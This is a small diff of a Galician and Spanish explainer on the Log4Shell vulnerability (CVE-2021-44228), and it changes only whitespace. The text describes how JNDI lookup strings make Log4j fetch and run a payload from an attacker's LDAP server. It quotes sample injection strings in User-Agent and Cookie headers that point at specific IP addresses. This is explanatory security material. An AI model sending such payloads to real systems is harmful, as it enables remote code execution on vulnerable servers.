@@ -8,7 +8,7 @@ Os atacantes lanzan peticións maliciosas coa seguinte estrutura: `${jndi:ldap:/
   
 `User-Agent: ${jndi:ldap://2.57.121.36:8000/mss}`
   
-  `Cookie: ${jndi:ldap://45.83.64.1/securityscan-3g32njrlbok56r5i}`
+`Cookie: ${jndi:ldap://45.83.64.1/securityscan-3g32njrlbok56r5i}`
 
 Tras a publicación da vulnerabilidade, o GovCERT.ch (Computer Emergency Response Team) de Suíza publicou a seguinte imaxe que resume o proceso de ataque e as medidas de defensa: 
   
@@ -21,6 +21,7 @@ El 9 de diciembre de 2021 se hace pública la vulnerabilidad **CVE-2021-44228** 
 Los atacantes lanzan peticiones maliciosas con la siguiente estructura: `${jndi:ldap://<servidor del atacante>/<payload>}` o `${jndi:dns://<servidor do atacante>/<payload>}`. Este tipo de peticiones al ser procesadas por Log4j provocan que el equipo víctima se conecte al servidor LDAP del atacante, se descargue el payload y lo ejecute. A continuación se pueden ver algunos ejemplos de peticiones maliciosas incrustadas en campos del protocolo HTTP:
   
 `User-Agent: ${jndi:ldap://2.57.121.36:8000/mss}`
+
 `Cookie: ${jndi:ldap://45.83.64.1/securityscan-3g32njrlbok56r5i}`
 
 Tras la publicación de la vulnerabilidad, el GovCERT.ch (Computer Emergency Response Team) de Suiza publicó la anterior imagen que resume el proceso de ataque y las medidas de defensa
